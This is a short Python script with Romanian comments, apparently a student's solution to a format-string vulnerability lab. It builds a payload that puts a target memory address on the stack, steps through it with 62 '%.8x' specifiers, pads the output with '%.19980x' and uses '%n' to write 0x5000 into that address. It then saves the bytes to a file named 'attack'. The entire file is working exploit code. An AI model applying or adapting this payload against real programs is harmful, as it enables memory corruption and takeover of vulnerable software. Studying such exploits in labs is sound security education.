#!/usr/bin/python3
import sys

# Initialize the content array
N=64                                                        # de la al 64-lea specificator se acceseaza perimii 4 octeti din input
content = bytearray(0x0 for i in range(4+(N-1)* 4 + 8 ))    #4 octeti pentru adresa, 63 * 4  octeti pentru primii 62 si al 64-lea specificatori, 
                                                            # 8 octeti pentru cel de-al 63 -lea specificator
#se pune adresa in codul format 
address  = 0x080e5068                                       #adresa variabilei target in care sa se puna valoarea 0x5000
content[0:4]  =  (address).to_bytes(4,byteorder='little')   #se pune adresa in stringul de input
s = "%.8x"* (N-2)                                           #se pun primii 62 de specificatori -> pentru a a junge la variabila pusa pe stiva            
# The line shows how to store the string s at offset 8      # 62 * 8 = 496 de caractere => + restul de 4 care se afiseaza din adresa => 500 caractere=> 
fmt  = (s).encode('latin-1')                                # mai raman de afisat 20480 - 500 = 19980
content[4:4+len(fmt)] = fmt                                                          
#adauagarea celui de-al 63-lea element care sa fac padding
intermediate_length = 4+len(fmt)
s63  = "%.19980x"
fmt  = (s63).encode('latin-1')
content[intermediate_length:8+intermediate_length] = fmt     # se pun cele 8 caractere ce reprezinta specifacatorul pentru al 63-a valoare de pe stiva
intermediate_length = intermediate_length + 8
schimbare = "%n\n\n"                                         #se pune %n ca fiind al 64 -lea speficator; acesta va scrie la adresa targetului numarul de caractere 
                                                             #afisate ; am adaugat \n\n pentru a face lungimea stringului format multiplu de 4                                          
fmt_afisaj  = (schimbare).encode('latin-1')
content[intermediate_length: intermediate_length +len(fmt)] = fmt_afisaj   #se ataseaza stringuui de format %n -ul
# Write the content to badfile
with open('attack', 'wb') as f:                            #se scrie in fisier valoarea
  f.write(content)